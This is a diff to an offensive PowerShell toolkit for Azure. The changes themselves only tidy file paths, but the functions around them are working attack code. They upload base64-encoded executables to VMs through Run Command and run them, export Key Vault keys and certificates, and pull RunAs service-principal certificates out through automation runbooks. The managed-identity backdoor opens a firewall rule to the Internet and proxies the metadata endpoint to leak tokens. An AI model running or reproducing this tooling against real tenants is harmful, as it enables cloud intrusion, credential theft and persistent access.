@@ -842,7 +842,7 @@ function Export-AzureKeyVaultContent
 	
 	If($Type -eq 'Key')
 	{
-		$Path = $OutFilePath + '\key.pem'
+		$Path = Join-Path $OutFilePath 'key.pem'
 		$Export = Get-AzKeyVaultKey -VaultName $VaultName -KeyName $Name -OutFile $Path
 		If($Export)
 		{
@@ -855,7 +855,7 @@ function Export-AzureKeyVaultContent
 	}
 	If($Type -eq 'Certificate')
 	{
-		$Path = $OutFilePath + '\Cert.pfx'
+		$Path = Join-Path $OutFilePath 'Cert.pfx'
 		$cert = Get-AzKeyVaultCertificate -VaultName $Vaultname -Name $Name
 		$secret = Get-AzKeyVaultSecret -VaultName $vaultName -Name $cert.Name
 		$secretByte = [Convert]::FromBase64String($secret.SecretValueText)
@@ -864,7 +864,7 @@ function Export-AzureKeyVaultContent
 		$type = [System.Security.Cryptography.X509Certificates.X509ContentType]::Pfx
 		$pfxFileByte = $x509Cert.Export($type, $password)
 		[System.IO.File]::WriteAllBytes("$Path", $pfxFileByte)
-		$test = ls C:\temp\cert.pfx
+		$test = ls $Path
 		If($test)
 		{
 			Write-Host "Successfully exported Certificate to $path" -Foregroundcolor Green
@@ -1127,25 +1127,26 @@ function Invoke-AzureRunCommand
     {
         $details = Get-AzVM -Name $VMName
 
-        If($Command)
-        {
+	        If($Command)
+	        {
+	            $TempPath = [System.IO.Path]::GetTempPath()
 
-            If($details.OSProfile.WindowsConfiguration)
-            {
-                $new = New-Item -Name "WindowsDiagnosticTest.ps1" -ItemType "file" -Value $Command -Force
-                $path = $new.DirectoryName + '\' + $new.Name  
-                $result = Invoke-AzVMRunCommand -ResourceGroupName $details.ResourceGroupName -VMName $VMName -CommandId 'RunPowerShellScript' -ScriptPath $path -verbose
-                $result.value.Message
-                rm $path
+	            If($details.OSProfile.WindowsConfiguration)
+	            {
+	                $new = New-Item -Path (Join-Path $TempPath "WindowsDiagnosticTest.ps1") -ItemType "file" -Value $Command -Force
+	                $path = $new.FullName  
+	                $result = Invoke-AzVMRunCommand -ResourceGroupName $details.ResourceGroupName -VMName $VMName -CommandId 'RunPowerShellScript' -ScriptPath $path -verbose
+	                $result.value.Message
+	                rm $path
 
-            }
-            If($details.OSProfile.LinuxConfiguration)
-            {
-                $new = New-Item -Name "LinuxDiagnosticTest.sh" -ItemType "file" -Value $Command
-                $path = $new.DirectoryName + '\' + $new.Name  
-                $result = Invoke-AzVMRunCommand -ResourceGroupName $details.ResourceGroupName -VMName $VMName -CommandId 'RunShellScript' -ScriptPath $path
-                $result.value.Message
-                rm $path
+	            }
+	            If($details.OSProfile.LinuxConfiguration)
+	            {
+	                $new = New-Item -Path (Join-Path $TempPath "LinuxDiagnosticTest.sh") -ItemType "file" -Value $Command
+	                $path = $new.FullName  
+	                $result = Invoke-AzVMRunCommand -ResourceGroupName $details.ResourceGroupName -VMName $VMName -CommandId 'RunShellScript' -ScriptPath $path
+	                $result.value.Message
+	                rm $path
             }            
         }
         If($Script)
@@ -1188,21 +1189,23 @@ function Invoke-AzureRunProgram
     [Parameter(Mandatory=$true)][String]$File = $null,
     [Parameter(Mandatory=$true)][String]$VMName = $null)
 
-    if($VMName -and $File -match '\\')
-    {
-        $details = Get-AzVM -Name $VMName
-        If($details.OSProfile.WindowsConfiguration)
-        {
-            $ByteArray = [System.IO.File]::ReadAllBytes($File)
-            $Base64String = [System.Convert]::ToBase64String($ByteArray) | Out-File temp.ps1 #This is necessary because raw output is too long for a command to be passed over az vm run-command invoke, so it must be in a script. 
-            Write-Host "Uploading Payload..."
-			$upload = Invoke-AzVMRunCommand -ResourceGroupName $details.ResourceGroupName -VMName $VMName -CommandId 'RunPowerShellScript' -ScriptPath temp.ps1 -verbose
-			$command = '$path = gci | sort LastWriteTime | select -last 2; $name=$path.Name[0]; $data = Get-Content C:\Packages\Plugins\Microsoft.CPlat.Core.RunCommandWindows\1.1.5\Downloads\$name ;$Decode = [System.Convert]::FromBase64String($data);[System.IO.File]::WriteAllBytes("test.exe",$Decode);C:\Packages\Plugins\Microsoft.CPlat.Core.RunCommandWindows\1.1.5\Downloads\test.exe'
-            $new = New-Item -Name "WindowsDiagnosticTest.ps1" -ItemType "file" -Value $command -Force
-            $path = $new.DirectoryName + '\' + $new.Name  
-			Write-Host "Executing Payload..."
-            $result = Invoke-AzVMRunCommand -ResourceGroupName $details.ResourceGroupName -VMName $VMName -CommandId 'RunPowerShellScript' -ScriptPath $path -verbose
-            $result.value.Message 
+    if($VMName -and [System.IO.Path]::IsPathFullyQualified($File))
+	    {
+	        $details = Get-AzVM -Name $VMName
+	        If($details.OSProfile.WindowsConfiguration)
+	        {
+	            $TempPath = [System.IO.Path]::GetTempPath()
+	            $UploadPath = Join-Path $TempPath "temp.ps1"
+	            $ByteArray = [System.IO.File]::ReadAllBytes($File)
+	            $Base64String = [System.Convert]::ToBase64String($ByteArray) | Out-File $UploadPath #This is necessary because raw output is too long for a command to be passed over az vm run-command invoke, so it must be in a script. 
+	            Write-Host "Uploading Payload..."
+				$upload = Invoke-AzVMRunCommand -ResourceGroupName $details.ResourceGroupName -VMName $VMName -CommandId 'RunPowerShellScript' -ScriptPath $UploadPath -verbose
+				$command = '$path = gci | sort LastWriteTime | select -last 2; $name=$path.Name[0]; $data = Get-Content C:\Packages\Plugins\Microsoft.CPlat.Core.RunCommandWindows\1.1.5\Downloads\$name ;$Decode = [System.Convert]::FromBase64String($data);[System.IO.File]::WriteAllBytes("test.exe",$Decode);C:\Packages\Plugins\Microsoft.CPlat.Core.RunCommandWindows\1.1.5\Downloads\test.exe'
+	            $new = New-Item -Path (Join-Path $TempPath "WindowsDiagnosticTest.ps1") -ItemType "file" -Value $command -Force
+	            $path = $new.FullName  
+				Write-Host "Executing Payload..."
+	            $result = Invoke-AzVMRunCommand -ResourceGroupName $details.ResourceGroupName -VMName $VMName -CommandId 'RunPowerShellScript' -ScriptPath $path -verbose
+	            $result.value.Message 
             rm $path           
         }
 
@@ -1212,7 +1215,7 @@ function Invoke-AzureRunProgram
             $result.value.Message
         }       
     }
-    elseif(!$VMName -or $File -notmatch '\\')
+    elseif(!$VMName -or -not [System.IO.Path]::IsPathFullyQualified($File))
     { 
         Write-Host "-File must contain the full path to the file" -ForegroundColor Red
         Write-Host "Usage: Invoke-AzureRunProgram -VMName AzureWin10 -File C:\path\to\.exe" -ForegroundColor Red
@@ -1239,13 +1242,13 @@ function Invoke-AzureRunMSBuild
 
     $details = Get-AzVM -Name $VMName
     $upload = Invoke-AzVMRunCommand -ResourceGroupName $details.ResourceGroupName -VMName $VMName -CommandId 'RunPowerShellScript' -ScriptPath $File -verbose
-    If($upload.Value)
-    {
-        $command = '$path = gci | sort LastWriteTime | select -last 2; $name=$path.Name[0]; Start-Process C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSbuild.exe C:\Packages\Plugins\Microsoft.CPlat.Core.RunCommandWindows\1.1.5\Downloads\$name'
-        $new = New-Item -Name "WindowsDiagnosticMSBuild.ps1" -ItemType "file" -Value $Command -Force
-        $path = $new.DirectoryName + '\' + $new.Name  
-        $run = Invoke-AzVMRunCommand -ResourceGroupName $details.ResourceGroupName -VMName $VMName -CommandId 'RunPowerShellScript' -ScriptPath $path -verbose
-        $run.value.Message 
+	    If($upload.Value)
+	    {
+	        $command = '$path = gci | sort LastWriteTime | select -last 2; $name=$path.Name[0]; Start-Process C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSbuild.exe C:\Packages\Plugins\Microsoft.CPlat.Core.RunCommandWindows\1.1.5\Downloads\$name'
+	        $new = New-Item -Path (Join-Path ([System.IO.Path]::GetTempPath()) "WindowsDiagnosticMSBuild.ps1") -ItemType "file" -Value $Command -Force
+	        $path = $new.FullName  
+	        $run = Invoke-AzVMRunCommand -ResourceGroupName $details.ResourceGroupName -VMName $VMName -CommandId 'RunPowerShellScript' -ScriptPath $path -verbose
+	        $run.value.Message 
         rm $path
     }
 }
@@ -1278,23 +1281,25 @@ function Invoke-AzureCommandRunbook
     $ResourceGroup = $AA.ResourceGroupName
     $VMResourceGroup = $OS.ResourceGroupName
     $Modules = Get-AzAutomationModule -ResourceGroupName $ResourceGroup -AutomationAccountName $automationaccount
-    If($Modules.Name -notcontains 'AzureRM.Compute' -and $Modules.Name -notcontains 'AzureRM.profile')
-    {
-	New-AzAutomationModule -AutomationAccountName $AutomationAccount -Name "AzureRM.Compute" -ContentLink https://devopsgallerystorage.blob.core.windows.net:443/packages/azurerm.compute.5.9.1.nupkg -ResourceGroupName $ResourceGroup | Out-Null
-    New-AzAutomationModule -AutomationAccountName $AutomationAccount -Name "AzureRM.Profile" -ContentLink https://devopsgallerystorage.blob.core.windows.net:443/packages/azurerm.profile.5.8.3.nupkg -ResourceGroupName $ResourceGroup | Out-Null
-    }
-	If($OS.OSProfile.WindowsConfiguration)
-	{
-		$data  = '$VMname = ' + '"' + $VMName + '"'| Out-File -Append AzureAutomationTutorialPowerShell.ps1
-		$data1 = '$connectionName = "AzureRunAsConnection"' | Out-File -Append AzureAutomationTutorialPowerShell.ps1
-		$data2 = '$servicePrincipalConnection=Get-AutomationConnection -Name $connectionName' | Out-File -Append AzureAutomationTutorialPowerShell.ps1
-		$data3 = 'Add-AzureRmAccount -ServicePrincipal -TenantId $servicePrincipalConnection.TenantId -ApplicationId $servicePrincipalConnection.ApplicationId -CertificateThumbprint $servicePrincipalConnection.CertificateThumbprint' | Out-File -Append AzureAutomationTutorialPowerShell.ps1
-		$data4 = 'New-Item C:\temp\test.ps1' | Out-File -Append AzureAutomationTutorialPowerShell.ps1
-		$data5 = "echo $Command >> C:\temp\test.ps1" | Out-File -Append AzureAutomationTutorialPowerShell.ps1
-		$data6 = '$z = Invoke-AzureRmVMRunCommand -ResourceGroupName ' + $VMResourceGroup + ' -VMName ' + $VMName + ' -CommandId RunPowerShellScript -ScriptPath "C:\temp\test.ps1"' | Out-File -Append AzureAutomationTutorialPowerShell.ps1
-		$data7 = '$z.Value[0].Message' | Out-File -Append AzureAutomationTutorialPowerShell.ps1
-		Write-Host "Uploading Runbook..." -ForegroundColor Green
-		Import-AzAutomationRunbook -Path .\AzureAutomationTutorialPowerShell.ps1 -ResourceGroup $ResourceGroup -AutomationAccountName $AutomationAccount -Type PowerShell | Out-Null
+	    If($Modules.Name -notcontains 'AzureRM.Compute' -and $Modules.Name -notcontains 'AzureRM.profile')
+	    {
+		New-AzAutomationModule -AutomationAccountName $AutomationAccount -Name "AzureRM.Compute" -ContentLink https://devopsgallerystorage.blob.core.windows.net:443/packages/azurerm.compute.5.9.1.nupkg -ResourceGroupName $ResourceGroup | Out-Null
+	    New-AzAutomationModule -AutomationAccountName $AutomationAccount -Name "AzureRM.Profile" -ContentLink https://devopsgallerystorage.blob.core.windows.net:443/packages/azurerm.profile.5.8.3.nupkg -ResourceGroupName $ResourceGroup | Out-Null
+	    }
+	    $TempPath = [System.IO.Path]::GetTempPath()
+		If($OS.OSProfile.WindowsConfiguration)
+		{
+			$RunbookPath = Join-Path $TempPath 'AzureAutomationTutorialPowerShell.ps1'
+			$data  = '$VMname = ' + '"' + $VMName + '"'| Out-File -Append $RunbookPath
+			$data1 = '$connectionName = "AzureRunAsConnection"' | Out-File -Append $RunbookPath
+			$data2 = '$servicePrincipalConnection=Get-AutomationConnection -Name $connectionName' | Out-File -Append $RunbookPath
+			$data3 = 'Add-AzureRmAccount -ServicePrincipal -TenantId $servicePrincipalConnection.TenantId -ApplicationId $servicePrincipalConnection.ApplicationId -CertificateThumbprint $servicePrincipalConnection.CertificateThumbprint' | Out-File -Append $RunbookPath
+			$data4 = 'New-Item C:\temp\test.ps1' | Out-File -Append $RunbookPath
+			$data5 = "echo $Command >> C:\temp\test.ps1" | Out-File -Append $RunbookPath
+			$data6 = '$z = Invoke-AzureRmVMRunCommand -ResourceGroupName ' + $VMResourceGroup + ' -VMName ' + $VMName + ' -CommandId RunPowerShellScript -ScriptPath "C:\temp\test.ps1"' | Out-File -Append $RunbookPath
+			$data7 = '$z.Value[0].Message' | Out-File -Append $RunbookPath
+			Write-Host "Uploading Runbook..." -ForegroundColor Green
+			Import-AzAutomationRunbook -Path $RunbookPath -ResourceGroup $ResourceGroup -AutomationAccountName $AutomationAccount -Type PowerShell | Out-Null
 		Write-Host "Publishing Runbook..." -ForegroundColor Green
 		Publish-AzAutomationRunbook -ResourceGroup $ResourceGroup -AutomationAccountName $AutomationAccount -Name AzureAutomationTutorialPowerShell	| Out-Null
 		Write-Host "Starting Runbook..." -ForegroundColor Green
@@ -1313,22 +1318,23 @@ function Invoke-AzureCommandRunbook
 
 		}
 		$timer.Stop()
-		$value
-		Remove-AzAutomationRunbook -ResourceGroup $ResourceGroup -AutomationAccountName $AutomationAccount -Name AzureAutomationTutorialPowerShell -Force
-		rm AzureAutomationTutorialPowerShell.ps1
-	}
-	else
-	{
-		$data  = '$VMname = ' + '"' + $VMName + '"'| Out-File -Append BashAutomationTutorial.sh
-		$data1 = '$connectionName = "AzureRunAsConnection"' | Out-File -Append BashAutomationTutorial.sh
-		$data2 = '$servicePrincipalConnection=Get-AutomationConnection -Name $connectionName' | Out-File -Append BashAutomationTutorial.sh
-		$data3 = 'Add-AzureRmAccount ` -ServicePrincipal ` -TenantId $servicePrincipalConnection.TenantId ` -ApplicationId $servicePrincipalConnection.ApplicationId ` -CertificateThumbprint $servicePrincipalConnection.CertificateThumbprint' | Out-File -Append BashAutomationTutorial.sh
-		$data4 = 'New-Item test.sh' | Out-File -Append BashAutomationTutorial.sh
-		$data5 = "echo $Command >> test.sh" | Out-File -Append BashAutomationTutorial.sh
-		$data6 = '$z = Invoke-AzureRmVMRunCommand -ResourceGroupName ' + $VMResourceGroup + ' -VMName ' + $VMName + ' -CommandId RunShellScript -ScriptPath "./test1.sh"' | Out-File -Append BashAutomationTutorial.sh
-		$data7 = '$z.Value[0].Message' | Out-File -Append BashAutomationTutorial.sh
-		Write-Host "Uploading Runbook..." -ForegroundColor Green
-		Import-AzAutomationRunbook -Path .\BashAutomationTutorial.sh -ResourceGroup $ResourceGroup -AutomationAccountName $AutomationAccount -Type PowerShell
+			$value
+			Remove-AzAutomationRunbook -ResourceGroup $ResourceGroup -AutomationAccountName $AutomationAccount -Name AzureAutomationTutorialPowerShell -Force
+			rm $RunbookPath
+		}
+		else
+		{
+			$RunbookPath = Join-Path $TempPath 'BashAutomationTutorial.sh'
+			$data  = '$VMname = ' + '"' + $VMName + '"'| Out-File -Append $RunbookPath
+			$data1 = '$connectionName = "AzureRunAsConnection"' | Out-File -Append $RunbookPath
+			$data2 = '$servicePrincipalConnection=Get-AutomationConnection -Name $connectionName' | Out-File -Append $RunbookPath
+			$data3 = 'Add-AzureRmAccount ` -ServicePrincipal ` -TenantId $servicePrincipalConnection.TenantId ` -ApplicationId $servicePrincipalConnection.ApplicationId ` -CertificateThumbprint $servicePrincipalConnection.CertificateThumbprint' | Out-File -Append $RunbookPath
+			$data4 = 'New-Item test.sh' | Out-File -Append $RunbookPath
+			$data5 = "echo $Command >> test.sh" | Out-File -Append $RunbookPath
+			$data6 = '$z = Invoke-AzureRmVMRunCommand -ResourceGroupName ' + $VMResourceGroup + ' -VMName ' + $VMName + ' -CommandId RunShellScript -ScriptPath "./test1.sh"' | Out-File -Append $RunbookPath
+			$data7 = '$z.Value[0].Message' | Out-File -Append $RunbookPath
+			Write-Host "Uploading Runbook..." -ForegroundColor Green
+			Import-AzAutomationRunbook -Path $RunbookPath -ResourceGroup $ResourceGroup -AutomationAccountName $AutomationAccount -Type PowerShell
 		Write-Host "Publishing Runbook..." -ForegroundColor Green
 		Publish-AzAutomationRunbook -ResourceGroup $ResourceGroup -AutomationAccountName $AutomationAccount -Name BashAutomationTutorial
 		Write-Host "Starting Runbook..." -ForegroundColor Green
@@ -1346,12 +1352,12 @@ function Invoke-AzureCommandRunbook
 			$value = $record.Value[2].value
 
 		}
-		$value
-		$timer.Stop()
-		Remove-AzAutomationRunbook -ResourceGroup $ResourceGroup -AutomationAccountName $AutomationAccount -Name BashAutomationTutorial -Force
-		rm BashAutomationTutorial.sh
+			$value
+			$timer.Stop()
+			Remove-AzAutomationRunbook -ResourceGroup $ResourceGroup -AutomationAccountName $AutomationAccount -Name BashAutomationTutorial -Force
+			rm $RunbookPath
+		}
 	}
-}
 
 function New-AzureBackdoor
 {
@@ -1444,17 +1450,19 @@ function Get-AzureRunAsCertificate
     $CurrentUser = Get-AzContext
     $AA = Get-AzAutomationAccount | Where-Object {$_.AutomationAccountName -eq "$AutomationAccount"}   
     $name = $AA.AutomationAccountName
-    $AppData = Get-AzADApplication | Where-Object {$_.DisplayName -match "$name"}
-    $ResourceGroup = $AA.ResourceGroupName
-	$data1 = '$RunAsCert = Get-AutomationCertificate -Name "AzureRunAsCertificate"' | Out-File  AutomationTutorialPowerShell.ps1 -Force
-	$data2 = '$CertPath = Join-Path $env:temp  "AzureRunAsCertificate.pfx"' | Out-File -Append AutomationTutorialPowerShell.ps1
-	$data3 = '$Cert = $RunAsCert.Export("pfx",$Password)' | Out-File -Append AutomationTutorialPowerShell.ps1
-	$data4 = '$Password = "YourStrongPasswordForTheCert" ' | Out-File -Append AutomationTutorialPowerShell.ps1
-	$data5 = 'Set-Content -Value $Cert -Path $CertPath -Force -Encoding Byte | Write-Verbose' | Out-File -Append AutomationTutorialPowerShell.ps1
-    $data6 = '$RunAsCert' | Out-File -Append AutomationTutorialPowerShell.ps1
-	$data6 = '[Convert]::ToBase64String([IO.File]::ReadAllBytes($CertPath))' | Out-File -Append AutomationTutorialPowerShell.ps1
-	Write-Host "Uploading Runbook..." -ForegroundColor Green
-	Import-AzAutomationRunbook -Path .\AutomationTutorialPowerShell.ps1 -ResourceGroup $ResourceGroup -AutomationAccountName $AutomationAccount -Type PowerShell | Out-Null
+	    $AppData = Get-AzADApplication | Where-Object {$_.DisplayName -match "$name"}
+	    $ResourceGroup = $AA.ResourceGroupName
+	    $TempPath = [System.IO.Path]::GetTempPath()
+	    $RunbookPath = Join-Path $TempPath 'AutomationTutorialPowerShell.ps1'
+		$data1 = '$RunAsCert = Get-AutomationCertificate -Name "AzureRunAsCertificate"' | Out-File $RunbookPath -Force
+		$data2 = '$CertPath = Join-Path $env:temp  "AzureRunAsCertificate.pfx"' | Out-File -Append $RunbookPath
+		$data3 = '$Cert = $RunAsCert.Export("pfx",$Password)' | Out-File -Append $RunbookPath
+		$data4 = '$Password = "YourStrongPasswordForTheCert" ' | Out-File -Append $RunbookPath
+		$data5 = 'Set-Content -Value $Cert -Path $CertPath -Force -Encoding Byte | Write-Verbose' | Out-File -Append $RunbookPath
+    $data6 = '$RunAsCert' | Out-File -Append $RunbookPath
+		$data6 = '[Convert]::ToBase64String([IO.File]::ReadAllBytes($CertPath))' | Out-File -Append $RunbookPath
+		Write-Host "Uploading Runbook..." -ForegroundColor Green
+		Import-AzAutomationRunbook -Path $RunbookPath -ResourceGroup $ResourceGroup -AutomationAccountName $AutomationAccount -Type PowerShell | Out-Null
 	Write-Host "Publishing Runbook..." -ForegroundColor Green
 	Publish-AzAutomationRunbook -ResourceGroup $ResourceGroup -AutomationAccountName $AutomationAccount -Name AutomationTutorialPowerShell| Out-Null
 	Write-Host "Starting Runbook..." -ForegroundColor Green
@@ -1471,24 +1479,23 @@ function Get-AzureRunAsCertificate
 	$record = Get-AzAutomationJobOutput -ResourceGroupName $ResourceGroup -AutomationAccountName $AutomationAccount -Id $jobid -Stream Any | Get-AzAutomationJobOutputRecord
 	}
 	$timer.Stop()	
-    $thumbprint = $record.Value.Thumbprint
-	$tenant = $CurrentUser.Tenant.Id
-	$appID = $AppData.ApplicationId
-	$b64 = $record.Value.value
-	New-item AzureRunAsCertificate.pfx -Force | Out-Null
-	$Password = "YourStrongPasswordForTheCert"
-	$SecurePassword = ConvertTo-SecureString $Password -AsPlainText -Force
-	$d = pwd
-	$CertPath = $d.Path + "\AzureRunAsCertificate.pfx"
-	[IO.File]::WriteAllBytes($CertPath, [Convert]::FromBase64String($b64))
+	    $thumbprint = $record.Value.Thumbprint
+		$tenant = $CurrentUser.Tenant.Id
+		$appID = $AppData.ApplicationId
+		$b64 = $record.Value.value
+		$Password = "YourStrongPasswordForTheCert"
+		$SecurePassword = ConvertTo-SecureString $Password -AsPlainText -Force
+		$CertPath = Join-Path $TempPath 'AzureRunAsCertificate.pfx'
+		New-item $CertPath -Force | Out-Null
+		[IO.File]::WriteAllBytes($CertPath, [Convert]::FromBase64String($b64))
 	Write-Host "Importing Certificate" -ForegroundColor Green
 	$import = Import-PfxCertificate -FilePath $CertPath -CertStoreLocation Cert:\LocalMachine\My -Password $SecurePassword -Exportable
 	Write-Host "Done! To login as the service principal, copy+paste the following command: " -ForegroundColor Green
-	Write-Host ""
-	Write-Host "Connect-AzAccount -CertificateThumbprint "$thumbprint" -ApplicationId "$appID" -Tenant "$tenant"" -ForegroundColor Green
-	Remove-AzAutomationRunbook -ResourceGroup $ResourceGroup -AutomationAccountName $AutomationAccount -Name AutomationTutorialPowerShell -Force
-	rm AutomationTutorialPowerShell.ps1
-}
+		Write-Host ""
+		Write-Host "Connect-AzAccount -CertificateThumbprint "$thumbprint" -ApplicationId "$appID" -Tenant "$tenant"" -ForegroundColor Green
+		Remove-AzAutomationRunbook -ResourceGroup $ResourceGroup -AutomationAccountName $AutomationAccount -Name AutomationTutorialPowerShell -Force
+		rm $RunbookPath
+	}
 
 function Get-AzureSQLDB
 {
@@ -1963,14 +1970,14 @@ function Invoke-AzureMIBackdoor
 	$id = $sp.id	
 	$roleadd = New-AzRoleAssignment -ObjectId $id -RoleDefinitionName $role -Scope $scope
 	If($roleadd){
-		If($NoRDP){
-			$NSG = Get-AzNetworkSecurityGroup -Name $VM*
-			Add-AzNetworkSecurityRuleConfig -Access Allow -DestinationAddressPrefix * -DestinationPortRange 80 -Direction Inbound -Name HTTP -Priority 101 -Protocol Tcp -SourceAddressPrefix 'Internet' -SourcePortRange * -NetworkSecurityGroup $NSG | Set-AzNetworkSecurityGroup
-			$Command = '$ip = (Get-WmiObject -Class Win32_NetworkAdapterConfiguration | where {$_.DHCPEnabled -ne $null -and $_.DefaultIPGateway -ne $null}).IPAddress[0] ;netsh interface portproxy add v4tov4 listenport=80 listenaddress=$ip connectport=80 connectaddress=169.254.169.254'
-			$new = New-Item -Name "WindowsDiagnosticTest.ps1" -ItemType "file" -Value $Command -Force
-			$path = $new.DirectoryName + '\' + $new.Name 
-			Write-Host "Modifying Port Proxying rules..." -ForegroundColor Yellow
-			$change = Invoke-AzVMRunCommand -VMName $vm -ResourceGroup $rg -CommandId 'RunPowerShellScript' -ScriptPath $path
+			If($NoRDP){
+				$NSG = Get-AzNetworkSecurityGroup -Name $VM*
+				Add-AzNetworkSecurityRuleConfig -Access Allow -DestinationAddressPrefix * -DestinationPortRange 80 -Direction Inbound -Name HTTP -Priority 101 -Protocol Tcp -SourceAddressPrefix 'Internet' -SourcePortRange * -NetworkSecurityGroup $NSG | Set-AzNetworkSecurityGroup
+				$Command = '$ip = (Get-WmiObject -Class Win32_NetworkAdapterConfiguration | where {$_.DHCPEnabled -ne $null -and $_.DefaultIPGateway -ne $null}).IPAddress[0] ;netsh interface portproxy add v4tov4 listenport=80 listenaddress=$ip connectport=80 connectaddress=169.254.169.254'
+				$new = New-Item -Path (Join-Path ([System.IO.Path]::GetTempPath()) "WindowsDiagnosticTest.ps1") -ItemType "file" -Value $Command -Force
+				$path = $new.FullName 
+				Write-Host "Modifying Port Proxying rules..." -ForegroundColor Yellow
+				$change = Invoke-AzVMRunCommand -VMName $vm -ResourceGroup $rg -CommandId 'RunPowerShellScript' -ScriptPath $path
 			rm $path
 			If($change.value.displaystatus[1] -eq 'Provisioning succeeded'){
 				$name = $VM + '*-ip'
@@ -1988,12 +1995,12 @@ function Invoke-AzureMIBackdoor
 					}	
 				}			
 			}	
-		else{
-			$Command = '$ip = (Get-WmiObject -Class Win32_NetworkAdapterConfiguration | where {$_.DHCPEnabled -ne $null -and $_.DefaultIPGateway -ne $null}).IPAddress[0] ;netsh interface portproxy add v4tov4 listenport=3389 listenaddress=$ip connectport=80 connectaddress=169.254.169.254'
-			$new = New-Item -Name "WindowsDiagnosticTest.ps1" -ItemType "file" -Value $Command -Force
-			$path = $new.DirectoryName + '\' + $new.Name 
-			Write-Host "Modifying Port Proxying rules..." -ForegroundColor Yellow
-			$change = Invoke-AzVMRunCommand -VMName $vm -ResourceGroup $rg -CommandId 'RunPowerShellScript' -ScriptPath $path
+			else{
+				$Command = '$ip = (Get-WmiObject -Class Win32_NetworkAdapterConfiguration | where {$_.DHCPEnabled -ne $null -and $_.DefaultIPGateway -ne $null}).IPAddress[0] ;netsh interface portproxy add v4tov4 listenport=3389 listenaddress=$ip connectport=80 connectaddress=169.254.169.254'
+				$new = New-Item -Path (Join-Path ([System.IO.Path]::GetTempPath()) "WindowsDiagnosticTest.ps1") -ItemType "file" -Value $Command -Force
+				$path = $new.FullName 
+				Write-Host "Modifying Port Proxying rules..." -ForegroundColor Yellow
+				$change = Invoke-AzVMRunCommand -VMName $vm -ResourceGroup $rg -CommandId 'RunPowerShellScript' -ScriptPath $path
 			rm $path
 			If($change.value.displaystatus[1] -eq 'Provisioning succeeded'){
 			$name = $VM + '*-ip'
@@ -2144,9 +2151,9 @@ $Uri = 'https://management.azure.com/' + $split[2] + '?api-version=2021-07-01'
 $RestMethod = Invoke-RestMethod -Method PATCH -Uri $uri -Body $Json -Header $Headers -ContentType 'application/json'}
 rm C:\Packages\Plugins\Microsoft.CPlat.Core.RunCommandWindows\1.1.9\Downloads\*
 '@
-	$new = New-Item -Name "WindowsDiagnosticTest.ps1" -ItemType "file" -Value $data
-	$path = $new.DirectoryName + '\' + $new.Name 
-	Write-Host "Uploading Agent..." -ForegroundColor Yellow
+		$new = New-Item -Path (Join-Path ([System.IO.Path]::GetTempPath()) "WindowsDiagnosticTest.ps1") -ItemType "file" -Value $data
+		$path = $new.FullName 
+		Write-Host "Uploading Agent..." -ForegroundColor Yellow
 	$change = Invoke-AzVMRunCommand -VMName $vm -ResourceGroup $rg -CommandId 'RunPowerShellScript' -ScriptPath $path
 	If($change){
 		Write-Host "Agent successfully deployed!" -Foregroundcolor Green
